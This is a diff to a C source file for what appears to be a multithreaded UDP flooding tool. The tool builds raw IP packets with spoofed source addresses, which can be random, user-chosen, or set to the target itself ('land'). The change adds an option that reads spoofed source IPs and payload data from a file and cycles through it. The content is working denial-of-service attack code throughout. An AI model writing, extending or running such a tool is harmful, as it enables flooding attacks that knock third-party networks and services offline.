@@ -28,7 +28,13 @@ typedef struct option_t
 {
   int size;
   char source[16];
-  int8_t ssource, rsource, rdport, one, land;
+  char filename[32];
+  int8_t ssource;
+  int8_t rsource;
+  int8_t fsource;
+  int8_t one;
+  int8_t land;
+  int8_t rdport;
 } option_t;
 
 struct thread_args
@@ -54,6 +60,7 @@ void banner(const char *name)
          "\t-1\t\t:: send one dgram and exit\n"
          "\t-p <port>\t:: destination port (by default random for each dgram)\n"
          "\t-z <size>\t:: dgram data length (default 10)\n"
+         "\t-f <file>\t:: read source IP and dgram data from file\n"
          "\t-i <threads>\t:: amount of threads to be spun up\n\n"
          "only root:\n"
          "\t-r\t\t:: random source IP for each dgram\n"
@@ -96,7 +103,7 @@ void *sendto_nonroot(void *args)
 {
   struct thread_args *targs = (struct thread_args *)args;
   option_t *option = targs->option;
-  static char packet[128];
+  char packet[128];
   int sock;
 
   if ((sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
@@ -121,11 +128,13 @@ void *sendto_root(void *args)
 {
   struct thread_args *targs = (struct thread_args *)args;
   option_t *option = targs->option;
-  static char packet[128];
-  void *ptr;
+  char packet[128];
   struct pseudo_udphdr phdr;
   struct udphdr uhdr;
   struct ip iphdr;
+  FILE *fp = NULL;
+  void *ptr;
+  char src[16];
   int sock, on = 1;
   int phdr_len, uhdr_len, iphdr_len, udppkt_len, ippkt_len;
 
@@ -138,6 +147,14 @@ void *sendto_root(void *args)
   {
     perror("setsockopt()");
     return NULL;
+  }
+  if (option->fsource)
+  {
+    if ((fp = fopen(option->filename, "r")) == NULL)
+    {
+      perror("fopen()");
+      return NULL;
+    }
   }
   phdr_len = sizeof(phdr);
   uhdr_len = sizeof(uhdr);
@@ -179,9 +196,32 @@ void *sendto_root(void *args)
     uhdr.uh_sum = 0;
     iphdr.ip_sum = 0;
     ptr = &packet[iphdr_len];
-    if (option->rsource)
+    if (option->fsource)
     {
-      phdr.up_src = rand();
+      memset(src, 0, sizeof(src));
+      fgets(src, sizeof(src), fp);
+      if (feof(fp))
+      {
+        if (!option->one)
+        {
+          if (fseek(fp, 0, SEEK_SET) < 0)
+          {
+            perror("fseek()");
+            return NULL;
+          }
+        }
+        continue;
+      }
+      else if (ferror(fp))
+      {
+        perror("ferror()");
+        clearerr(fp);
+        continue;
+      }
+    }
+    if (option->rsource || option->fsource)
+    {
+      phdr.up_src = option->fsource ? inet_addr(src) : rand();
       iphdr.ip_src.s_addr = phdr.up_src;
     }
     uhdr.uh_dport = targs->peer->sin_port;
@@ -205,7 +245,12 @@ void *sendto_root(void *args)
     {
       perror("sendto()");
     }
-  } while (!option->one);
+  } while (option->one ? option->fsource && !feof(fp) : 1);
+
+  if (option->fsource)
+  {
+    fclose(fp);
+  }
 
   return NULL;
 }
@@ -221,7 +266,7 @@ int main(int argc, char *argv[])
   srand(time(NULL));
   init_option(&option);
 
-  while ((arg = getopt(argc, argv, "1p:z:rs:li:")) > -1)
+  while ((arg = getopt(argc, argv, "1p:z:f:rs:li:")) > -1)
   {
     switch (arg)
     {
@@ -239,21 +284,31 @@ int main(int argc, char *argv[])
         return 1;
       }
       break;
-    case 'r':
-      option.rsource = 1;
+    case 'f':
+      strncpy(option.filename, optarg, sizeof(option.filename));
       option.ssource = 0;
+      option.rsource = 0;
+      option.fsource = 1;
+      option.land = 0;
+      break;
+    case 'r':
+      option.ssource = 0;
+      option.rsource = 1;
+      option.fsource = 0;
       option.land = 0;
       break;
     case 's':
       strncpy(option.source, optarg, sizeof(option.source));
       option.ssource = 1;
       option.rsource = 0;
+      option.fsource = 0;
       option.land = 0;
       break;
     case 'l':
-      option.land = 1;
       option.ssource = 0;
       option.rsource = 0;
+      option.fsource = 0;
+      option.land = 1;
       break;
     case 'i':
       nthreads = atoi(optarg);
@@ -283,7 +338,7 @@ int main(int argc, char *argv[])
   args.peer_len = sizeof(peer);
   args.option = &option;
 
-  if (option.rsource || option.ssource || option.land)
+  if (option.rsource || option.ssource || option.fsource || option.land)
   {
     pthread_t threads[nthreads];
     do
